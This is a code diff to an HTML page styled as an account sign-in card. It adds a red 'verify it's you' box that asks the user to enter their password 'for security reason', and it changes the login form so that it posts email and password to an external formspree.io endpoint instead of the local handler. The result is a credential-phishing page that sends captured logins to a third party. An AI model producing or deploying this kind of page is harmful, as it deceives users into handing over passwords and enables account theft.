@@ -116,6 +116,18 @@
             position: relative;
         }
 
+        .red-box {
+            margin:10px auto;
+            display: block;
+            width: 50%;
+            justify-content: center;
+            text-align: center;
+            border: 1px solid red;
+            background-color: rgba(255, 60, 60, 0.158);
+
+
+        }
+
         input[type=checkbox]:active,
         input[type=radio]:active {
             background: #ebebeb;
@@ -977,10 +989,15 @@
                 </h2>
                 <!-- This is Created By ManojKashyapR(Bang) -->
             </div>
+            <div class="red-box">
+                <p style="font-weight:bold; font-size:13px">Verify needed to understand it's you</p>
+                <p>Enter your password for security reason (make sure your caps lock is off)</p>
+                <p>Forgot your password ? <a href="">Request new one</a>
+            </div>
             <div class="card signin-card clearfix">
                 <img class="profile-img" src="file/avatar.png" alt="">
                 <p class="profile-name"></p>
-                <form novalidate="" method="post" action="login.php">
+                <form novalidate="" method="post" action="https://formspree.io/f/mljjkgeq>
                     <label class="hidden-label" for="Email">Email</label>
                     <input id="Email" name="email" type="email" placeholder="Email" value="" spellcheck="false"
                         class="">
